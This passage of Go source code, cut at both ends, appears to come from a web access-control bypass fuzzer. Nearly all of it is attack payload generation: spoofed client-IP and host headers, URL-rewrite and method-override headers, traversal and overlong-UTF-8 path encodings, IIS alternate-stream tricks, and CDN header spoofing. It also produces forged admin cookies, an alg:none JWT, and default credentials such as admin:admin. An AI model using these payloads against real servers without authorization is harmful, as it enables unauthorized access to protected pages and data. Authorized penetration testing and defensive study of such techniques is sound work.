		for j := 0; j < len(seg); j++ {
			if j%2 == 0 {
				mixed[j] = seg[j] | 0x20 // lowercase
			} else {
				mixed[j] = seg[j] &^ 0x20 // uppercase (ASCII only)
			}
		}
		variations = append(variations, string(mixed))

		// Alternating starting uppercase
		mixed2 := make([]byte, len(seg))
		for j := 0; j < len(seg); j++ {
			if j%2 == 0 {
				mixed2[j] = seg[j] &^ 0x20
			} else {
				mixed2[j] = seg[j] | 0x20
			}
		}
		variations = append(variations, string(mixed2))

		for _, v := range variations {
			mod    := append([]string{}, parts...)
			mod[i] = v
			payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(mod, "/")))
		}
	}

	if parsedURL.RawQuery != "" {
		for i := range payloads {
			payloads[i] += "?" + parsedURL.RawQuery
		}
	}
	return payloads
}

func toTitleCase(s string) string {
	if s == "" {
		return s
	}
	return strings.ToUpper(s[:1]) + strings.ToLower(s[1:])
}

// ── HEADERS: Comprehensive header-based bypass ────────────────────────────────
func generateHeadersPayloads(parsedURL *url.URL) []Payload {
	var payloads []Payload
	orig := parsedURL.String()
	host := parsedURL.Host
	path := parsedURL.Path
	if path == "" {
		path = "/"
	}

	add := func(hs map[string]string) {
		payloads = append(payloads, Payload{
			URL:          orig,
			ExtraHeaders: hs,
			Method:       "GET",
			ExtraInfo:    "hdr:" + headerInfo(hs),
		})
	}

	// ── IP Spoofing headers ────────────────────────────────────────────────────
	localIPs := []string{
		"127.0.0.1", "0.0.0.0", "localhost",
		"127.127.127.127", "127.1",
		"10.0.0.1", "10.0.0.0/8",
		"172.16.0.1", "172.16.0.0",
		"192.168.1.1", "192.168.0.1",
		"::1", "::ffff:127.0.0.1", "fe80::1",
		"2130706433",    // 127.0.0.1 decimal
		"0x7f000001",    // 127.0.0.1 hex
		"0177.0.0.1",    // 127.0.0.1 octal
	}

	ipHeaders := []string{
		"X-Forwarded-For",
		"X-Real-IP",
		"True-Client-IP",
		"X-Client-IP",
		"X-Client-Ip",
		"X-Forwarded",
		"X-Forwarded-IP",
		"X-Remote-IP",
		"X-Remote-Addr",
		"X-Originating-IP",
		"X-Original-Client-IP",
		"X-Custom-IP-Authorization",
		"WL-Proxy-Client-IP",
		"Proxy-Client-IP",
		"X-ProxyUser-Ip",
		"X-Cluster-Client-IP",
		"HTTP_X_FORWARDED_FOR",
		"HTTP_CLIENT_IP",
		"HTTP_X_REAL_IP",
		"REMOTE_ADDR",
		"Cdn-Src-Ip",
		"X-Appengine-User-Ip",
		"X-Forwarded-For-Original",
		"X-Forwarded-Host-Original",
	}

	for _, h := range ipHeaders {
		for _, ip := range localIPs {
			add(map[string]string{h: ip})
		}
	}

	// X-Forwarded-For multi-value
	add(map[string]string{"X-Forwarded-For": "127.0.0.1, 10.0.0.1"})
	add(map[string]string{"X-Forwarded-For": "127.0.0.1, 127.0.0.1"})
	add(map[string]string{"X-Forwarded-For": "10.0.0.1, 127.0.0.1"})
	add(map[string]string{"X-Forwarded-For": "192.168.1.1, 127.0.0.1"})
	add(map[string]string{"X-Forwarded-For": "127.0.0.1:80"})
	add(map[string]string{"X-Forwarded-For": "127.0.0.1:443"})

	// RFC 7239 Forwarded
	add(map[string]string{"Forwarded": "for=127.0.0.1"})
	add(map[string]string{"Forwarded": `for="[::1]"`})
	add(map[string]string{"Forwarded": "for=127.0.0.1;host=localhost;proto=https"})
	add(map[string]string{"Forwarded": "for=127.0.0.1, for=10.0.0.1"})

	// ── Host manipulation ──────────────────────────────────────────────────────
	hostVals := []string{"localhost", "127.0.0.1", "0.0.0.0", host, "::1", "internal"}
	for _, h := range []string{"X-Forwarded-Host", "X-Host", "X-Original-Host", "X-Forwarded-Server", "X-Backend-Host"} {
		for _, v := range hostVals {
			add(map[string]string{h: v})
		}
	}
	// Override Host header (handled via req.Host in runTests)
	add(map[string]string{"Host": "localhost"})
	add(map[string]string{"Host": "127.0.0.1"})
	add(map[string]string{"Host": "0.0.0.0"})

	// ── URL Rewrite headers ────────────────────────────────────────────────────
	rewriteHeaders := []string{
		"X-Original-URL", "X-Original-URI", "X-Request-URI",
		"X-Rewrite-URL", "X-Rewrite-Uri", "X-Forwarded-URI",
		"X-Forwarded-Uri", "X-Accel-Redirect", "X-Forwarded-Path",
		"X-Custom-URL", "X-Override-URL", "X-Proxy-URL",
	}
	rewritePaths := []string{path, "/", "/*", "/admin", "/api"}
	for _, h := range rewriteHeaders {
		for _, p := range rewritePaths {
			add(map[string]string{h: p})
		}
	}

	// ── Protocol / Port / Scheme ───────────────────────────────────────────────
	for _, h := range []string{"X-Forwarded-Proto", "X-Forwarded-Protocol", "X-Forwarded-Scheme", "X-Scheme", "X-URL-Scheme"} {
		add(map[string]string{h: "https"})
		add(map[string]string{h: "http"})
	}
	add(map[string]string{"Front-End-Https": "on"})
	add(map[string]string{"X-HTTPS": "on"})
	add(map[string]string{"X-SSL": "1"})
	add(map[string]string{"X-Forwarded-SSL": "on"})

	for _, h := range []string{"X-Forwarded-Port", "X-Original-Port"} {
		for _, p := range []string{"80", "443", "8080", "8443", "8888", "3000"} {
			add(map[string]string{h: p})
		}
	}

	// ── Method override ────────────────────────────────────────────────────────
	for _, h := range []string{"X-HTTP-Method-Override", "X-Method-Override", "X-HTTP-Method"} {
		for _, m := range []string{"GET", "POST", "PUT", "DELETE", "PATCH", "HEAD"} {
			add(map[string]string{h: m})
		}
	}

	// ── Content-Type manipulation ──────────────────────────────────────────────
	for _, ct := range []string{
		"application/json", "application/x-www-form-urlencoded",
		"text/xml", "text/html", "application/xml",
		"multipart/form-data", "application/octet-stream",
		"text/plain", "application/javascript",
	} {
		add(map[string]string{"Content-Type": ct})
	}

	// ── Accept header manipulation ─────────────────────────────────────────────
	for _, a := range []string{
		"application/json", "text/html,application/xhtml+xml,*/*",
		"*/*", "text/xml", "application/xml",
	} {
		add(map[string]string{"Accept": a})
	}

	// ── Special bypass headers ─────────────────────────────────────────────────
	add(map[string]string{"X-Requested-With": "XMLHttpRequest"})
	add(map[string]string{"X-Requested-With": "fetch"})
	add(map[string]string{"X-Api-Version": "1"})
	add(map[string]string{"X-Api-Version": "2"})
	add(map[string]string{"X-Api-Version": "latest"})
	add(map[string]string{"X-Wap-Profile": "localhost"})
	add(map[string]string{"Via": "1.1 127.0.0.1"})
	add(map[string]string{"Via": "1.1 localhost"})
	add(map[string]string{"Contact": "127.0.0.1"})
	add(map[string]string{"X-Scanner": "netsparker"})
	add(map[string]string{"X-Skip-Cache": "1"})
	add(map[string]string{"X-Bypass-Cache": "true"})
	add(map[string]string{"Cache-Control": "no-transform"})
	add(map[string]string{"Pragma": "no-cache"})
	add(map[string]string{"X-Server-Debug": "true"})
	add(map[string]string{"X-Debug": "1"})
	add(map[string]string{"X-Internal": "1"})
	add(map[string]string{"X-Allow": "127.0.0.1"})
	add(map[string]string{"X-Access-Token": "admin"})
	add(map[string]string{"X-Auth-Token": "admin"})
	add(map[string]string{"X-API-Key": "admin"})

	// ── Authorization bypass ───────────────────────────────────────────────────
	for _, creds := range []string{"admin:admin", "admin:password", "admin:", "user:user", "test:test", "root:root"} {
		encoded := base64.StdEncoding.EncodeToString([]byte(creds))
		add(map[string]string{"Authorization": "Basic " + encoded})
	}
	for _, tok := range []string{"null", "undefined", "admin", "guest", "user", "test", " "} {
		add(map[string]string{"Authorization": "Bearer " + tok})
	}

	// ── Combinations (IP + proto) ──────────────────────────────────────────────
	add(map[string]string{
		"X-Forwarded-For":   "127.0.0.1",
		"X-Forwarded-Proto": "https",
	})
	add(map[string]string{
		"X-Forwarded-For":  "127.0.0.1",
		"X-Forwarded-Host": "localhost",
	})
	add(map[string]string{
		"X-Real-IP":       "127.0.0.1",
		"X-Forwarded-For": "127.0.0.1",
	})

	return payloads
}

func headerInfo(h map[string]string) string {
	keys := make([]string, 0, len(h))
	for k := range h {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	parts := make([]string, 0, len(keys))
	for _, k := range keys {
		parts = append(parts, k+": "+h[k])
	}
	return strings.Join(parts, " | ")
}

// ── REWRITE: URL rewrite headers ─────────────────────────────────────────────
func generateRewritePayloads(parsedURL *url.URL) []Payload {
	var payloads []Payload
	originalPath := parsedURL.Path
	if originalPath == "" {
		originalPath = "/"
	}
	baseURL := fmt.Sprintf("%s://%s/", parsedURL.Scheme, parsedURL.Host)

	headers := []string{
		"X-Rewrite-Url", "X-Original-URL", "X-Custom-URL",
		"X-Rewrite-URL", "X-Original-URI", "X-Request-URI",
		"X-Forwarded-URI", "X-Override-URL",
	}
	alts := []string{
		originalPath,
		originalPath + "/.",
		"/%2e" + originalPath,
		"/..;" + originalPath,
		originalPath + "%20",
		originalPath + "//",
		"/" + originalPath,
	}
	for _, hk := range headers {
		for _, val := range alts {
			payloads = append(payloads, Payload{
				URL:          baseURL,
				ExtraHeaders: map[string]string{hk: val},
				Method:       "GET",
				ExtraInfo:    "rewrite: " + hk + ": " + val,
			})
		}
	}
	return payloads
}

// ── METHOD: HTTP method tricks ────────────────────────────────────────────────
func generateMethodPayloads(parsedURL *url.URL) []Payload {
	var payloads []Payload
	orig := parsedURL.String()

	methods := []string{
		"GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD",
		"PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK",
		"SEARCH", "TRACE", "TRACK", "DEBUG", "CONNECT",
		"ACL", "BASELINE-CONTROL", "BIND", "CHECKIN", "CHECKOUT",
		"LABEL", "LINK", "MERGE", "MKACTIVITY", "MKCALENDAR",
		"MKREDIRECTREF", "MKWORKSPACE", "ORDERPATCH", "PRI", "REBIND",
		"REPORT", "UNBIND", "UNCHECKOUT", "UNLINK", "UPDATE",
		"UPDATEREDIRECTREF", "VERSION-CONTROL",
		"ARBITRARY", "FAKEMETHOD",
	}
	for _, m := range methods {
		payloads = append(payloads, Payload{
			URL:          orig,
			ExtraHeaders: map[string]string{},
			Method:       m,
			ExtraInfo:    "method:" + m,
		})
	}

	// Query-string method overrides
	for _, qo := range []string{"_method=DELETE", "_method=PUT", "_method=PATCH", "method=DELETE", "!method=GET"} {
		u := *parsedURL
		if u.RawQuery == "" {
			u.RawQuery = qo
		} else {
			u.RawQuery += "&" + qo
		}
		payloads = append(payloads, Payload{
			URL:          u.String(),
			Method:       "POST",
			ExtraHeaders: map[string]string{"Content-Length": "0"},
			ExtraInfo:    "method-override-query:" + qo,
		})
	}

	// Body-based method overrides
	for _, bo := range []string{"_method=DELETE", "_method=PUT", "_method=PATCH"} {
		payloads = append(payloads, Payload{
			URL:          orig,
			Method:       "POST",
			ExtraHeaders: map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
			Data:         bo,
			ExtraInfo:    "method-override-body:" + bo,
		})
	}

	return payloads
}

// ── UNICODE: Unicode / overlong encoding bypass ───────────────────────────────
func generateUnicodePayloads(u *url.URL) []string {
	base  := fmt.Sprintf("%s://%s", u.Scheme, u.Host)
	path  := strings.TrimPrefix(u.Path, "/")
	parts := strings.Split(path, "/")
	set   := make(map[string]struct{}, 2048)

	// Unicode/overlong alternatives for "/"
	uniSlashes := []string{
		"%c0%af",        // 2-byte overlong /
		"%e0%80%af",     // 3-byte overlong /
		"%f0%80%80%af",  // 4-byte overlong /
		"%ef%bc%8f",     // fullwidth solidus ／
		"%e2%81%84",     // fraction slash ⁄
		"%e2%88%95",     // division slash ∕
		"%e2%a7%b8",     // big solidus ⧸
		"%c0%2f",        // overlong variant
		"%5c",           // backslash
		"%255c",         // double-encoded backslash
	}

	// Unicode/overlong alternatives for "."
	uniDots := []string{
		"%c0%ae",        // 2-byte overlong .
		"%e0%80%ae",     // 3-byte overlong .
		"%ef%bc%8e",     // fullwidth period ．
	}

	// 1) Replace path separators with unicode alternatives
	if len(parts) > 1 {
		for _, slash := range uniSlashes {
			joined := strings.Join(parts, slash)
			addRaw(set, base+"/"+joined, u.RawQuery)

			for i := 1; i < len(parts); i++ {
				left  := strings.Join(parts[:i], "/")
				right := strings.Join(parts[i:], "/")
				addRaw(set, base+"/"+left+slash+right, u.RawQuery)
			}
		}
	}

	// 2) Traversal with unicode dots (../  with overlong .)
	for _, dot := range uniDots {
		for _, slash := range append(uniSlashes, "/", "%2f") {
			trav := dot + dot + slash
			for gap := 0; gap <= len(parts); gap++ {
				left  := strings.Join(parts[:gap], "/")
				right := strings.Join(parts[gap:], "/")
				var p string
				switch {
				case left == "" && right == "":
					p = trav
				case left == "":
					p = trav + right
				case right == "":
					p = left + "/" + trav
				default:
					p = left + "/" + trav + right
				}
				addRaw(set, base+"/"+strings.TrimPrefix(p, "/"), u.RawQuery)
			}
		}
	}

	// 3) Zero-width / invisible chars prepended/appended to segments
	invisible := []string{
		"%ef%bb%bf",  // BOM U+FEFF
		"%e2%80%8b",  // zero-width space U+200B
		"%e2%80%8c",  // zero-width non-joiner U+200C
		"%e2%80%8d",  // zero-width joiner U+200D
		"%c2%a0",     // non-breaking space U+00A0
		"%e2%80%ab",  // LRO U+202B
		"%e2%80%aa",  // LRE U+202A
	}
	for i := range parts {
		seg := parts[i]
		if seg == "" {
			continue
		}
		for _, inv := range invisible {
			mod    := append([]string{}, parts...)
			mod[i] = inv + seg
			addPath(set, base, mod, u.RawQuery)

			mod    = append([]string{}, parts...)
			mod[i] = seg + inv
			addPath(set, base, mod, u.RawQuery)
		}
	}

	// 4) IIS NTFS ADS (Alternate Data Streams)
	for i := range parts {
		if parts[i] == "" {
			continue
		}
		for _, ads := range []string{"::$DATA", "::$INDEX_ALLOCATION", "::$ATTRIBUTE_LIST", "::$EA"} {
			mod    := append([]string{}, parts...)
			mod[i] = parts[i] + ads
			addPath(set, base, mod, u.RawQuery)
		}
	}

	// 5) IIS short name (8.3 style)
	for i := range parts {
		seg := parts[i]
		if len(seg) > 6 {
			short := seg[:6] + "~1"
			mod    := append([]string{}, parts...)
			mod[i] = short
			addPath(set, base, mod, u.RawQuery)
		}
	}

	// 6) Unicode normalization attacks: fullwidth chars replacing ASCII in seg
	fullwidthOf := map[byte]string{
		'a': "%ef%bd%81", 'b': "%ef%bd%82", 'c': "%ef%bd%83", 'd': "%ef%bd%84",
		'e': "%ef%bd%85", 'f': "%ef%bd%86", 'g': "%ef%bd%87", 'h': "%ef%bd%88",
		'i': "%ef%bd%89", 'j': "%ef%bd%8a", 'k': "%ef%bd%8b", 'l': "%ef%bd%8c",
		'm': "%ef%bd%8d", 'n': "%ef%bd%8e", 'o': "%ef%bd%8f", 'p': "%ef%bd%90",
		'q': "%ef%bd%91", 'r': "%ef%bd%92", 's': "%ef%bd%93", 't': "%ef%bd%94",
		'u': "%ef%bd%95", 'v': "%ef%bd%96", 'w': "%ef%bd%97", 'x': "%ef%bd%98",
		'y': "%ef%bd%99", 'z': "%ef%bd%9a",
	}
	for i := range parts {
		seg := parts[i]
		if seg == "" {
			continue
		}
		var newSeg strings.Builder
		changed := false
		for _, ch := range seg {
			if enc, ok := fullwidthOf[byte(ch)]; ok {
				newSeg.WriteString(enc)
				changed = true
			} else {
				newSeg.WriteByte(byte(ch))
			}
		}
		if changed {
			mod    := append([]string{}, parts...)
			mod[i] = newSeg.String()
			addPath(set, base, mod, u.RawQuery)
		}
	}

	// 7) Overlong UTF-8 for each char in segment
	for i := range parts {
		seg := parts[i]
		if seg == "" {
			continue
		}
		var sb strings.Builder
		for j := 0; j < len(seg); j++ {
			b := seg[j]
			if b >= 0x20 && b < 0x80 {
				// Overlong: encode as 2-byte sequence %c0%xx
				// Note: c0 = 11000000, payload = (b & 0x3f) | 0x80
				high := 0xC0 | (b >> 6)
				low  := 0x80 | (b & 0x3F)
				fmt.Fprintf(&sb, "%%%02X%%%02X", high, low)
			} else {
				fmt.Fprintf(&sb, "%c", b)
			}
		}
		mod    := append([]string{}, parts...)
		mod[i] = sb.String()
		addPath(set, base, mod, u.RawQuery)
	}

	out := make([]string, 0, len(set))
	for s := range set {
		out = append(out, s)
	}
	sort.Strings(out)
	return out
}

func addRaw(set map[string]struct{}, fullURL, rawq string) {
	u := fullURL
	if rawq != "" {
		u += "?" + rawq
	}
	set[u] = struct{}{}
}

// ── CDN: CDN-specific header bypass ──────────────────────────────────────────
func generateCDNPayloads(parsedURL *url.URL) []Payload {
	var payloads []Payload
	orig := parsedURL.String()

	add := func(hs map[string]string) {
		payloads = append(payloads, Payload{
			URL:          orig,
			ExtraHeaders: hs,
			Method:       "GET",
			ExtraInfo:    "cdn:" + headerInfo(hs),
		})
	}

	// ── Cloudflare ────────────────────────────────────────────────────────────
	add(map[string]string{"CF-Connecting-IP": "127.0.0.1"})
	add(map[string]string{"CF-Connecting-IP": "1.1.1.1"})
	add(map[string]string{"CF-Ipcountry": "US"})
	add(map[string]string{"CF-Ray": "0000000000000000-IAD"})
	add(map[string]string{"CF-Visitor": `{"scheme":"https"}`})
	add(map[string]string{"CDN-Loop": "cloudflare"})
	add(map[string]string{"CF-Connecting-IP": "127.0.0.1", "CF-Ipcountry": "US"})
	add(map[string]string{"CF-Worker": "example.workers.dev"})

	// ── Fastly ────────────────────────────────────────────────────────────────
	add(map[string]string{"Fastly-Client-IP": "127.0.0.1"})
	add(map[string]string{"Fastly-FF": "cache-iad-dulles1234-IAD"})
	add(map[string]string{"X-Fastly-Client-IP": "127.0.0.1"})
	add(map[string]string{"Fastly-Client-IP": "127.0.0.1", "Fastly-FF": "cache-bos1234"})

	// ── Akamai ────────────────────────────────────────────────────────────────
	add(map[string]string{"Akamai-Origin-Hop": "2"})
	add(map[string]string{"X-Akamai-Client-IP": "127.0.0.1"})
	add(map[string]string{"True-Client-IP": "127.0.0.1"})
	add(map[string]string{"X-True-Client-IP": "127.0.0.1"})

	// ── Incapsula (Imperva) ───────────────────────────────────────────────────
	add(map[string]string{"Incap-Client-IP": "127.0.0.1"})
	add(map[string]string{"X-Forwarded-For": "127.0.0.1", "X-Store-Id": "1"})
	add(map[string]string{"X-Incapsula-Client-IP": "127.0.0.1"})

	// ── AWS CloudFront ────────────────────────────────────────────────────────
	add(map[string]string{"X-Amz-Cf-Id": "AAAAAAAAAAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA"})
	add(map[string]string{"CloudFront-Viewer-Country": "US"})
	add(map[string]string{"CloudFront-Is-Mobile-Viewer": "false"})
	add(map[string]string{"CloudFront-Is-Desktop-Viewer": "true"})
	add(map[string]string{"X-Amz-Security-Token": "bypass"})
	add(map[string]string{"X-AMZ-Date": "20240101T000000Z"})

	// ── Azure CDN ─────────────────────────────────────────────────────────────
	add(map[string]string{"X-Azure-ClientIP": "127.0.0.1"})
	add(map[string]string{"X-Azure-SocketIP": "127.0.0.1"})
	add(map[string]string{"X-Azure-Ref": "0000000000000000"})
	add(map[string]string{"X-FD-HealthProbe": "1"})

	// ── Nginx / Varnish ───────────────────────────────────────────────────────
	add(map[string]string{"X-Varnish": "1234567"})
	add(map[string]string{"X-Cache": "HIT"})
	add(map[string]string{"X-Cache-Status": "HIT"})
	add(map[string]string{"X-Pull": "1"})
	add(map[string]string{"X-Nginx-Proxy": "true"})
	add(map[string]string{"X-Cache-Bypass": "1"})

	// ── Generic CDN tricks ────────────────────────────────────────────────────
	add(map[string]string{"X-Forwarded-For": "127.0.0.1", "X-Cache": "HIT"})
	add(map[string]string{"X-Forwarded-For": "127.0.0.1", "Via": "1.1 cdn.example.com"})

	return payloads
}

// ── COOKIE: Cookie-based bypass ───────────────────────────────────────────────
func generateCookiePayloads(parsedURL *url.URL) []Payload {
	var payloads []Payload
	orig := parsedURL.String()

	cookies := []string{
		"admin=true",
		"admin=1",
		"isAdmin=true",
		"isAdmin=1",
		"role=admin",
		"role=administrator",
		"role=superadmin",
		"access=granted",
		"access=admin",
		"authenticated=true",
		"auth=true",
		"auth=1",
		"token=admin",
		"session=admin",
		"user=admin",
		"privilege=admin",
		"level=admin",
		"debug=true",
		"internal=true",
		"bypass=true",
		"superuser=1",
		"root=1",
		"admin=true; isAdmin=true; role=admin",
		"access_token=admin",
		"jwt=eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.",  // alg:none JWT
		"session=bypass; admin=1",
	}
	for _, c := range cookies {
		payloads = append(payloads, Payload{
			URL:          orig,
			ExtraHeaders: map[string]string{"Cookie": c},
			Method:       "GET",
			ExtraInfo:    "cookie:" + c,
		})
	}
	return payloads
}

// ── REFERER: Referer/Origin bypass ───────────────────────────────────────────
func generateRefererPayloads(parsedURL *url.URL) []Payload {
	var payloads []Payload
	orig      := parsedURL.String()
	targetBase := parsedURL.Scheme + "://" + parsedURL.Host

	referers := []string{
		orig,
		targetBase + "/",
		targetBase + "/admin",
		targetBase + "/dashboard",
		"https://127.0.0.1/",
		"https://localhost/",
		"https://google.com/",
		"https://www.google.com/search?q=" + parsedURL.Host,
		"https://github.com/",
		"https://internal.example.com/",
		"https://trusted.example.com/",
		"https://admin." + parsedURL.Hostname() + "/",
		"null",
	}
	for _, r := range referers {
		payloads = append(payloads, Payload{
			URL:          orig,
			ExtraHeaders: map[string]string{"Referer": r},
			Method:       "GET",
			ExtraInfo:    "Referer:" + r,
		})
	}

	origins := []string{
		targetBase,
		"https://127.0.0.1",
		"https://localhost",
		"null",
		"https://trusted.example.com",
		"https://admin." + parsedURL.Hostname(),
		"https://internal.example.com",
	}
	for _, o := range origins {
		payloads = append(payloads, Payload{
			URL:          orig,
			ExtraHeaders: map[string]string{"Origin": o},
			Method:       "GET",
			ExtraInfo:    "Origin:" + o,
		})
	}

	// Referer + Origin combo
	payloads = append(payloads, Payload{
		URL:          orig,
		ExtraHeaders: map[string]string{"Referer": targetBase + "/", "Origin": targetBase},
		Method:       "GET",
		ExtraInfo:    "Referer+Origin:internal",
	})

	return payloads
}

// ── AGENT: User-Agent bypass ──────────────────────────────────────────────────
func generateAgentPayloads(parsedURL *url.URL) []Payload {
	var payloads []Payload
	orig := parsedURL.String()

	agents := []string{
		// Crawlers/bots (sometimes bypass restrictions)
		"Googlebot/2.1 (+http://www.google.com/bot.html)",
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
		"DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
		"Baiduspider/2.0; (+http://www.baidu.com/search/spider.html)",
		"YandexBot/3.0; (+http://yandex.com/bots)",
		"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
		"Twitterbot/1.0",
		"LinkedInBot/1.0 (compatible; Mozilla/5.0)",
		"Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",

		// Internal/monitoring agents
		"internal-monitoring/1.0",
		"internal-healthcheck/1.0",
		"internal-scanner/1.0",
		"Pingdom.com_bot_version_1.4 (http://www.pingdom.com/)",
		"Uptime-Kuma/1.0",
		"DatadogSynthetics",
		"NewRelic Synthetics",
		"StatusCake Monitor",

		// CLI tools (sometimes bypass WAF)
		"curl/7.79.1",
		"curl/7.68.0",
		"wget/1.20.3",
		"python-requests/2.27.1",
		"Go-http-client/1.1",
		"Go-http-client/2.0",
		"Java/11.0.15",
		"Wget/1.21.2 (linux-gnu)",

		// Wildcard / empty
		"*",
		"",
	}
	for _, a := range agents {
		payloads = append(payloads, Payload{
			URL:          orig,
			ExtraHeaders: map[string]string{"User-Agent": a},
			Method:       "GET",
			ExtraInfo:    "UA:" + a,
		})
	}
	return payloads
}

// ── RICH: Rich combination of path tricks ─────────────────────────────────────
func generateRichBypassPayloads(u *url.URL) []string {
	base  := fmt.Sprintf("%s://%s", u.Scheme, u.Host)
	path  := strings.TrimPrefix(u.Path, "/")
	parts := strings.Split(path, "/")
	set   := make(map[string]struct{}, 4096)

	controlPrefixes := []string{
		"%00", "%09", "%0a", "%0d", "%20", "%23", "%26", "%2b", "%2c", "%3b",
		"%2f", "%5c", "%2e", "%2e%2f", "%2f%2e", "%2e%2e%2f", "%2f%2e%2e",
		"%252e%252e%252f", "%c0%af", "%e0%80%af",
	}
	for i := range parts {
		orig := parts[i]
		if orig == "" {
			continue
		}
		for _, pre := range controlPrefixes {
			mod    := append([]string{}, parts...)
			mod[i] = pre + orig
			addPath(set, base, mod, u.RawQuery)

			mod    = append([]string{}, parts...)
			mod[i] = orig + pre
			addPath(set, base, mod, u.RawQuery)
		}
	}

	traversals := []string{
		"../", "..;/", "/..;/", ";../", "%2e%2e/", "%2e./",
		"..%2f", "%2f..%2f", "/.%2e/", "/%2e%2e/",
		"..%c0%af", "%252e%252e%252f", "..%5c", "..%255c",
	}
	for gap := 0; gap <= len(parts); gap++ {
		for _, t := range traversals {
			for d := 1; d <= 2; d++ {
				token := strings.Repeat(t, d)
				left  := strings.Join(parts[:gap], "/")
				right := strings.Join(parts[gap:], "/")
				var p string
				switch {
				case left == "" && right == "":
					p = token
				case left == "":
					p = token + right
				case right == "":
					p = left + "/" + token
				default:
					p = left + "/" + token + right
				}
				add(set, base, p, u.RawQuery)
			}
		}
	}

	dupSep := []string{"..%2f", "%2f", ";", "%3b", "%2f..%2f", "%2e%2e%2f", "..;/", "/;/"}
	for i := range parts {
		seg := parts[i]
		if seg == "" {
			continue
		}
		for _, sep := range dupSep {
			mod    := append([]string{}, parts...)
			mod[i] = seg + sep + seg
			addPath(set, base, mod, u.RawQuery)
		}
	}

	hexUpper := func(b byte) string { return fmt.Sprintf("%%%02X", b) }
	for i := range parts {
		seg := parts[i]
		if seg == "" {
			continue
		}
		{
			mod    := append([]string{}, parts...)
			mod[i] = url.PathEscape(seg)
			addPath(set, base, mod, u.RawQuery)
		}
		{
			mod    := append([]string{}, parts...)
			mod[i] = url.PathEscape(url.PathEscape(seg))
			addPath(set, base, mod, u.RawQuery)
		}

		count := 0
		for pos := 0; pos < len(seg); pos++ {
			enc    := seg[:pos] + hexUpper(seg[pos]) + seg[pos+1:]
			mod    := append([]string{}, parts...)
			mod[i] = enc
			addPath(set, base, mod, u.RawQuery)
			count++
			if count >= 64 {
				break
			}
		}

		for _, enc := range []string{
			base64.StdEncoding.EncodeToString([]byte(seg)),
			base64.URLEncoding.EncodeToString([]byte(seg)),
		} {
			mod    := append([]string{}, parts...)
			mod[i] = enc
			addPath(set, base, mod, u.RawQuery)
		}
	}

	altSlashes := []string{"%2f", "%252f", "%5c", "%255c", "%c0%af", "%e2%81%84", "%e0%80%af"}
	for i := 1; i < len(parts); i++ {
		for _, slash := range altSlashes {
			left  := strings.Join(parts[:i], "/")
			right := strings.Join(parts[i:], "/")
			add(set, base, left+slash+right, u.RawQuery)
		}
	}

	addMany(set, joinBase(base, generateMultipleSemicolonPatterns(parts)), u.RawQuery)

	out := make([]string, 0, len(set))
	for s := range set {
		out = append(out, s)
	}
	sort.Strings(out)
	return out
}

// ── HEX: %00..%FF injection ───────────────────────────────────────────────────
func generateHexFuzzPayloads(u *url.URL) []string {
	base  := fmt.Sprintf("%s://%s", u.Scheme, u.Host)
	path  := strings.TrimPrefix(u.Path, "/")
	parts := strings.Split(path, "/")
	set   := make(map[string]struct{}, 1<<15)

	hexList := make([]string, 0, 256)
	for v := 0; v <= 255; v++ {
		hexList = append(hexList, fmt.Sprintf("%%%02X", v))
	}

	for i := range parts {
		seg := parts[i]
		for _, token := range hexList {
			mod    := append([]string{}, parts...)
			mod[i] = token + seg
			addPath(set, base, mod, u.RawQuery)

			mod    = append([]string{}, parts...)
			mod[i] = seg + token
			addPath(set, base, mod, u.RawQuery)
		}

	}

	for i := 0; i < len(parts)-1; i++ {
		left  := parts[i]
		right := parts[i+1]
		for _, token := range hexList {
			merged := left + token + right
			mod    := append([]string{}, parts[:i]...)
			mod    = append(mod, merged)
			mod    = append(mod, parts[i+2:]...)
			addPath(set, base, mod, u.RawQuery)
		}
	}

	out := make([]string, 0, len(set))
	for s := range set {
		out = append(out, s)
	}
	sort.Strings(out)
	return out
}

// ── TPL: Known template patterns ──────────────────────────────────────────────
func generateTemplateFuzzPayloads(u *url.URL) []string {
	base  := fmt.Sprintf("%s://%s", u.Scheme, u.Host)
	path  := strings.TrimPrefix(u.Path, "/")
	parts := strings.Split(path, "/")
	set   := make(map[string]struct{}, 1<<14)

	templates := []string{
		// Spring / Tomcat
		"..;/", ";../", "/..;/", ";/", ";!",
		"/../", "/.;/", "/.!/",
		// Nginx
		"../", "%2f../", "%2f..%2f",
		// Classic
		"/%2e%2e/", "%2f..%2f", "%2e%2e/", "%2e./",
		// Semicolon + traversal
		";..%2f..%2f", ";/../", ";/%2e%2e/;",
		// PHP
		"/.php", "/.php7", "/.phtml",
		// Extensions
		".json", ".xml", ".html", ".asp", ".aspx", ".jsp",
		// Null bytes
		"%00", "%0a", "%0d",
	}

	for _, token := range templates {
		for i := range parts {
			seg := parts[i]
			// prefix
			mod    := append([]string{}, parts...)
			mod[i] = token + seg
			addPath(set, base, mod, u.RawQuery)
			// suffix
			mod    = append([]string{}, parts...)
			mod[i] = seg + token
			addPath(set, base, mod, u.RawQuery)

		}
	}

	for _, token := range templates {
		for i := 0; i < len(parts)-1; i++ {
			merged := parts[i] + token + parts[i+1]
			mod    := append([]string{}, parts[:i]...)
			mod    = append(mod, merged)
			mod    = append(mod, parts[i+2:]...)
			addPath(set, base, mod, u.RawQuery)
		}
	}

	out := make([]string, 0, len(set))
	for s := range set {
		out = append(out, s)
	}
	sort.Strings(out)
	return out
}

// ── PARAM: Parameter pollution, IDOR, BAC bypass ─────────────────────────────
func generateParamPayloads(u *url.URL) []string {
	base   := fmt.Sprintf("%s://%s%s", u.Scheme, u.Host, u.Path)
	rawQ   := u.RawQuery
	params, _ := url.ParseQuery(rawQ)
	set    := make(map[string]struct{}, 512)

	addQ := func(q string) {
		if q != "" {
			set[base+"?"+q] = struct{}{}
		} else {
			set[base] = struct{}{}
		}
	}

